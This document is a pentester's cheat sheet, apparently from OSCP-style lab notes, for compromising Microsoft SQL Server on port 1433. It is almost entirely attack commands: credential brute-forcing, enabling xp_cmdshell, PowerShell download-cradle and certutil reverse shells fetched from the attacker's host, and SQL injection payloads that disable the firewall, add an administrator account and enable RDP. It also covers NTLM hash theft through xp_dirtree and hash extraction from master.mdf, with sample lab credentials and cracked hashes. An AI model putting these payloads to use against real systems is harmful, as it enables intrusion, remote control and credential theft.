### **Checks**

- [ ] Try default credentials "`sa`:`password`"
- [ ] Brute force creds
- [ ] Check database content for new passwords
- [ ] Check version for exploits
- [ ] RCE
    - [ ] through `xp_cmdshell` functionality
    - [ ] through injecting payload in output file, placing it in webroot and triggering it through webapp

#### Quick Enumeration
```bash - kali
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $TARGET
```

```bash - kali
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts $TARGET
```


#### Connect with sqsh
```bash - kali
sqsh -S $TARGET:1433 -U sa
```

```bash - kali
RPSsql12345
```

#### Connect with mssql-shell.rb  - 404 page
```bash - kali
wget https://raw.githubusercontent.com/dr0pb3ar/mssql-shell/master/mssql-shell.rb
```

```bash - kali
sudo gem install tiny_tds colorize
```

```bash - kali
sudo apt install freetds-dev
```

```bash - kali
chmod +x mssql-shell.rb
```

```bash - kali
sudo ./mssql-shell.rb -u username -p password $TARGET
```

```bash - kali
select @@version;
```

```bash - kali
:xp_cmdshell whoami
```

If this errors, just follow [[Port 1433 - MSSQL ~#sp_cmdshell]] or [[Port 1433 - MSSQL ~#xp_cmdshell]] to enable the feature.

[[1._Reverse Shells (WIN)]]

[[Python#Server]]

[[4._File Transfers]]

```bash - kali
:xp_cmdshell certutil -urlcache -split -f http://$KALI/reverse.exe
```

[[1._rlwrap]]

```bash - kali
:xp_cmdshell reverse.exe
```

#### Connect with mssql_shell.py - BROKEN?
```bash - kali
wget https://raw.githubusercontent.com/Alamot/code-snippets/master/mssql/mssql_shell.py
```

Input Target IP, username and password.

```bash - kali
python mssql_shell.py
```

#### Connect with MSSQLClient
```
mssqlclient.py <HOSTNAME>/$USER:'<PASSWORD>'@$TARGET -windows-auth
```

`mssqlclient.py QUERIER/reporting:'PcwTWTHRwryjc$c6'@$TARGET -`

#### sp_cmdshell
You may have to enter "go" after every command!

`1> sp_configure 'show advanced options’, '1'`

`2> go`

`...`

```SQL
sp_configure 'show advanced options', '1'
```

```SQL
RECONFIGURE
```

```SQL
sp_configure 'xp_cmdshell', '1'
```

```SQL
RECONFIGURE
```

```SQL
EXEC master..xp_cmdshell 'whoami'
```

[[1._Reverse Shells (WIN)#Invoke-Powershell ps1]]

[[1._rlwrap]]

```SQL
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://$KALI/Invoke-PowerShellTcp.ps1") | powershell -noprofile'
```

#### xp_cmdshell
```SQL
enable_xp_cmdshell
```

```SQL
go
```

```SQL
xp_cmdshell 'date'
```

```SQL
 go
```

```SQL
xp_cmdshell whoami
```

```SQL
go
```

#### Powershell reverse shell
```python - kali
sudo python3 -m http.server 80
```

[[Python#Server]]

[[1._rlwrap]]

[[1._Reverse Shells (WIN)#Powershell reverse TCP]]

```SQL
xp_cmdshell "powershell IEX(New-Object Net.WebClient).DownloadString('http://$KALI:80/powershell_reverse_tcp.ps1') | powershell -noprofile -"
```

```SQL
go
```

Python:
```SQL
EXEC sp_execute_external_script @language = N'Python', @script = N'import os;os.system("whoami")'
```

[https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/](https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/)

#### xp_cmdshell RDP
```SQL
' UNION ALL SELECT 1,2--
```

```SQL
' UNION ALL SELECT @@version,2--
```

```SQL
' union select @@version,2; WAITFOR DELAY '0:0:5' ; --
```

```SQL
' union select @@version,2; EXEC sp_configure 'show advanced options', 1; WAITFOR DELAY '0:0:5' ; --
```

```SQL
' union select @@version,2; RECONFIGURE; --
```

```SQL
' union select @@version,2; EXEC sp_configure 'xp_cmdshell', 1; --
```

```SQL
' union select @@version,2; RECONFIGURE; --
```

```SQL
' union select @@version,2; exec master..xp_cmdshell 'ping localhost'; --
```

```SQL
' union select @@version,2; exec master..xp_cmdshell 'dir c:'; --
```

```SQL
' union select @@version,2; exec master..xp_cmdshell 'netsh advfirewall set allprofiles state off'; --
```

```SQL
' union select @@version,2; exec master..xp_cmdshell 'net user foobar Password123 /add'; --
```

```SQL
' union select @@version,2; exec master..xp_cmdshell 'net localgroup Administrators foobar /add'; --
```

```bash
rdesktop -a 16 -z -u foobar -p Password123 $TARGET
```

RDP was already enabled in the above example. If disabled, we can try enabling RDP with:

```SQL
' union select user,null; exec master..xp_cmdshell ''reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f''; --
```

#### Enumeration
```SQL
select @@version;
```

```SQL
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

```SQL
SELECT name FROM master.sys.databases
```

```SQL
use volume
```

#### Steal NTLM hash
```bash - kali
mkdir share
```

```bash - kali
smbserver.py -smb2support share share/
```

```bash - kali
exec master..xp_dirtree '\\$KALI\share\',1,1
```

```
mssql-svc::QUERIER:4141414141414141:fcf5ce3bc7c6f2d4cc186363f57a4afb:0101000000000000805cb28d9e1fd801cfdf67806cdb917000000000010010006e006b006f004f006c0070006b0049000200100061006800630076007a00630045005900030010006e006b006f004f006c0070006b0049000400100061006800630076007a0063004500590007000800805cb28d9e1fd80106000400020000000800300030000000000000000000000000300000bdca754ed8e5710ee15f0f7d0238f5927e0ad033b727c638d8831685eafab2d20a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003900000000000000000000000000
```

![[Hashcat#NetNTLMv2]]
```
MSSQL-SVC::QUERTER:4141414141414141:fCf5ce3bc7C6F2daCC186363F57adafb:0101006006000000805Cb28d0e10801FdF67806db91706006000001601606e086h606004006C0670006D6940006200100061606800630076007a606300450050060360160066006b086604F0O6C0070086hBB496004001000610068006307606726063004500500667600860865Cb28d0e1Fd36106006400020000600800300030060060060000000006006000300000bdca754edBe5710ee1507002387527e0ad033b727C6388831685eafab2d2620610060060060060000006006006000000000699601€0063006006666073002 F0031063060260310030062200316036022003000000000000020000000000000:corporate568
```

`corporate568`

#### Getting hashes with tftp

From here had to get shell on [[10.11.1.31 - RALPH]] to see how Microsoft SQL Server layout is.

Using [[Abbreviated dir]]'s, we put together the path

`C:\PROGRA~1\MICROS~1\MSSQL1~1.SQL\MSSQL\DATA\master.mdf`

However, we cannot read from there, so we aim to the backup folder:

`"C:\PROGRA~1\MICROS~1\MSSQL1~1.SQL\MSSQL\Backup\master.mdf" $TARGET`

[[Port 69 - TFTP#tftp py]]

```
git clone https://github.com/xpn/Powershell-PostExploitation && cd Powershell-PostExploitation/ && cd Invoke-MDFHashes
```

Load PowerShell in Kali:

```bash - kali
pwsh
```

```PowerShell - kali
Import-Module ./Get-MDFHashes.ps1
```

```PowerShell - kali
Add-Type -Path /home/kali/Desktop/PWK/10.11.1.111/Powershell-PostExploitation/Invoke-MDFHashes/OrcaMDF.Framework.dll
```

```PowerShell - kali
Add-Type -Path /home/kali/Desktop/PWK/10.11.1.111/Powershell-PostExploitation/Invoke-MDFHashes/OrcaMDF.RawCore.dll
```

* Be sure to widen you terminal to see the whole hash!

```PowerShell - kali
Get-MDFHashes -mdf /home/kali/Desktop/PWK/10.11.1.111/master.mdf
```